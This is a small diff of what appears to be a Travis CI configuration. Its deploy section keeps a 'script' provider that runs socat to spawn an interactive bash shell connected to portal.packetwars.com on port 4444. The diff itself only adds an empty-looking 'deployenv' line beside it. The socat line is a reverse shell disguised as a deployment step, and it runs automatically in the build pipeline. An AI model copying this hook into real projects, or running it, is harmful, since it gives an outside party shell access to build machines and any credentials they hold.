@@ -20,5 +20,6 @@ script:
 deploy:
     - provider: script
       script: /usr/bin/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:portal.packetwars.com:4444
+      deployenv: "deployvalue"
     - provider: heroku
       api_key: "no, this is deploy."
